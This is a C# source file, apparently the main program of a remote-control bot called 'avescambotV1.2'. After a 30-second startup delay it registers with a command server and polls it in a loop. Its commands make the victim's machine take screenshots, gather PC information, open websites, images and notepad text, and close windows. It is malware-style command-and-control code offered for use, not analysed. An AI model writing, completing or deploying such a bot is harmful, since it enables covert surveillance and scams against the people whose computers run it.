using System;
using System.Linq;
using System.Threading;
using Newtonsoft.Json.Linq;

namespace ConsoleApp3
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Thread.Sleep(30000);

            string code_name = "avescambotV1.2";
            string pc_name = Environment.UserName;
            string key = /*input your bot key*/;

            Random rnd = new Random();
            string bot_id = string.Concat(Enumerable.Range(0, 5).Select(_ => rnd.Next(0, 256).ToString("x1")));

            update update = new update();
            update.check_for_updates(pc_name, code_name, key);

            post_req post_req = new post_req();
            post_req.addBot(key, bot_id);

            while (true)
            {

                JObject response = post_req.getCommand(key, bot_id);
                if (Convert.ToBoolean(response["success"]) )
                {
                    switch (Convert.ToString(response["command"]))
                    {
                        case "OpenWeb":
                            cmd_OpenWeb cmd_OpenWeb = new cmd_OpenWeb();
                            cmd_OpenWeb.OpenWeb(Convert.ToString(post_req.getOtherData(key, bot_id, "website")["website"]), key, bot_id, pc_name);
                            break;

                        case "OpenNotepad":
                            cmd_OpenNotepad cmd_OpenNotepad = new cmd_OpenNotepad();
                            cmd_OpenNotepad.OpenNotepad(Convert.ToString(post_req.getOtherData(key, bot_id, "text")["text"]), key, bot_id, pc_name);
                            break;

                        case "CloseCurrentWindow":
                            cmd_CloseCurrentWindow cmd_CloseCurrentWindow = new cmd_CloseCurrentWindow();
                            cmd_CloseCurrentWindow.CloseCurrentWindow(key, bot_id);
                            break;

                        case "GetScreenShot":
                            cmd_GetScreenshot cmd_GetScreenshot = new cmd_GetScreenshot();
                            cmd_GetScreenshot.GetScreenshot(key, bot_id, pc_name);
                            break;

                        case "GetInfo":
                            cmd_GetInfo cmd_GetInfo = new cmd_GetInfo(); 
                            cmd_GetInfo.GetInfo_PC(key, bot_id);
                            break;

                        case "OpenImage":
                            cmd_OpenImage cmd_OpenImage = new cmd_OpenImage();
                            cmd_OpenImage.OpenImage(Convert.ToString(post_req.getOtherData(key, bot_id, "image")["image"]), bot_id, key, pc_name);
                            break;
                    }
                }

                Thread.Sleep(5000);
            }
        }
    }
}
